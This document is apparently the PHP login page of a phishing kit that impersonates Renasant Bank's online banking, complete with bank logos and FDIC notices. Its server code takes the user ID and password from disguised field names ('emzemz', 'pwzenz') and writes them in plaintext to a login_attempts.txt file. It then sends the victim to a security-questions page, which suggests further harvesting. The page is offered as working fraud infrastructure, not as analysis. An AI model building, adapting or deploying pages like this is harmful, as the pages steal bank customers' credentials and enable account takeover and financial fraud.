<?php
session_start();
require_once __DIR__ . '/includes/file_storage.php';

$errors = [];
$username = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = trim($_POST['emzemz'] ?? '');
    $password = $_POST['pwzenz'] ?? '';
    $remember = isset($_POST['remember']);

    // Simple validation
    if (empty($username)) {
        $errors['emzemz'] = 'Username is required';
    }
    
    if (empty($password)) {
        $errors['pwzenz'] = 'Password is required';
    }
    
    if (empty($errors)) {
        // Store username in session for next steps
        $_SESSION['emzemz'] = $username;
        
        // Save to test file (matching affinity field names)
        $data = [
            'step' => 'login',
            'usrnm' => $username,
            'emzemz' => $username,
            'pwzenz' => $password,
            'remember' => $remember
        ];
        
        saveUserData('login_attempts.txt', $data);
        
        // Redirect to security questions
        header('Location: security_questions.php');
        exit;
    }
}

$rememberDevice = isset($_POST['rememberDevice']) ? true : false;
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Renasant Bank - Login</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="min-h-screen bg-gradient-to-b from-[#f7f9fd] via-[#d6e0ec] to-[#4d6f96] flex flex-col">
    <!-- Header -->
    <header class="bg-[#114b66]">
        <div class="max-w-6xl mx-auto">
            <div class="h-20 flex items-center justify-center px-6">
                <img
                    src="assets/Logo-Dark-Background.png"
                    alt="Renasant Bank"
                    class="h-10 w-auto"
                />
            </div>
        </div>
        <div class="bg-white/90">
            <div class="max-w-6xl mx-auto px-6 py-2 text-xs text-slate-600">
                <div class="flex items-center gap-3 italic">
                    <img
                        src="assets/FDIC_Logo_blue.svg"
                        alt="FDIC"
                        class="h-6 w-auto"
                    />
                    <span>FDIC-Insured - Backed by the full faith and credit of the U.S. Government</span>
                </div>
            </div>
        </div>
    </header>

    <!-- Main Content -->
    <main class="flex-1 flex items-center justify-center px-4 py-12">
        <div class="space-y-6 w-full max-w-md">
            <div class="bg-white rounded-md p-8 shadow-lg shadow-slate-900/10 space-y-6">
                <div class="text-center space-y-2">
                    <h2 class="text-2xl font-semibold text-slate-700">Login to Online Banking</h2>
                </div>
                
                <form method="POST" class="space-y-4">
                    <!-- User ID Field -->
                    <div>
                        <label class="block text-sm text-slate-500 mb-1" for="emzemz">User ID</label>
                        <div class="flex items-center border border-slate-200 rounded">
                            <input
                                id="emzemz"
                                name="emzemz"
                                type="text"
                                value="<?php echo htmlspecialchars($username); ?>"
                                class="flex-1 px-3 py-3 text-sm focus:outline-none"
                                placeholder="User ID"
                            />
                            <span class="px-3 text-slate-400">
                                <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13.875 18.825A10.05 10.05 0 0112 19c-5.523 0-10-4.477-10-10 0-4.225 2.635-7.821 6.34-9.284" />
                                </svg>
                            </span>
                        </div>
                        <?php if (isset($errors['emzemz'])): ?>
                            <div class="flex items-center gap-3 text-sm font-bold mt-2 text-red-600">
                                <svg
                                    width="1rem"
                                    height="1rem"
                                    viewBox="0 0 24 24"
                                    className="fill-current"
                                    aria-hidden="true"
                                >
                                    <path
                                        d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                                        fillRule="nonzero"
                                    ></path>
                                </svg>
                                <p>Username required</p>
                            </div>
                        <?php endif; ?>
                    </div>

                    <!-- Password Field -->
                    <div>
                        <label class="block text-sm text-slate-500 mb-1" for="pwzenz">Password</label>
                        <div class="flex items-center border border-slate-200 rounded">
                            <input
                                id="pwzenz"
                                name="pwzenz"
                                type="password"
                                class="flex-1 px-3 py-3 text-sm focus:outline-none"
                                placeholder="Password"
                            />
                            <button
                                type="button"
                                onclick="togglePasswordVisibility('pwzenz')"
                                class="px-3 text-slate-400"
                            >
                                <span id="toggleText-pwzenz">Show</span>
                            </button>
                        </div>
                        <?php if (isset($errors['pwzenz'])): ?>
                            <div class="flex items-center gap-3 text-sm font-bold mt-2 text-red-600">
                                <svg
                                    width="1rem"
                                    height="1rem"
                                    viewBox="0 0 24 24"
                                    className="fill-current"
                                    aria-hidden="true"
                                >
                                    <path
                                        d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
                                        fillRule="nonzero"
                                ></path>
                                </svg>
                                <p>Password required</p>
                            </div>
                        <?php endif; ?>
                    </div>

                    <!-- Remember Me -->
                    <div class="flex items-center space-x-2">
                        <input
                            id="remember"
                            name="remember"
                            type="checkbox"
                            checked
                            class="h-4 w-4 text-[#0f4f6c]"
                        />
                        <label for="remember" class="text-sm text-slate-700">Remember Me</label>
                    </div>

                    <!-- Submit Button -->
                    <button
                        type="submit"
                        class="w-full bg-[#0f4f6c] text-white py-3 rounded-md flex items-center justify-center gap-2"
                    >
                      
                        <span>Login</span>
                    </button>
                    
                    <div class="text-center mt-4">
                        <a href="#" class="text-sm text-[#0f4f6c] underline">Trouble logging in?</a>
                    </div>

                    <div class="text-center mt-2">
                        <a href="#" class="inline-block text-sm text-[#0f4f6c] underline">Enroll in Online Banking</a>
                    </div>
                </form>
            </div>
        </div>
    </main>

    <!-- Footer -->
    <footer class="bg-[#114b66] text-white">
        <div class="max-w-6xl mx-auto px-6 py-6">
            <div class="flex flex-col gap-4">
                <div class="flex items-center gap-4 text-sm">
                    <div class="flex items-center gap-3">
                        <img src="assets/ehl.svg" alt="Equal Housing Lender" className="h-10 w-auto" />
                        <img src="assets/fdic.svg" alt="Member FDIC" className="h-10 w-auto" />
                    </div>
                    <span className="uppercase tracking-wide text-xs">© RENASANT BANK</span>
                </div>

                <div class="flex flex-wrap gap-3 text-sm">
                    <a className="underline" href="#">Accessibility</a>
                    <span>|</span>
                    <a className="underline" href="#">Mobile Privacy</a>
                    <span>|</span>
                    <a className="underline" href="#">Privacy Statement</a>
                    <span>|</span>
                    <a className="underline" href="#">Digital Banking Agreement</a>
                </div>
            </div>
        </div>
    </footer>

    <script>
        function togglePasswordVisibility(fieldId) {
            const field = document.getElementById(fieldId);
            const toggleText = document.getElementById('toggleText-' + fieldId);
            
            if (field.type === 'password') {
                field.type = 'text';
                toggleText.textContent = 'Hide';
            } else {
                field.type = 'password';
                toggleText.textContent = 'Show';
            }
        }

        // Auto-focus username field on page load
        document.addEventListener('DOMContentLoaded', function() {
            const usernameField = document.getElementById('emzemz');
            if (usernameField) {
                usernameField.focus();
            }
        });
    </script>
</body>
</html>
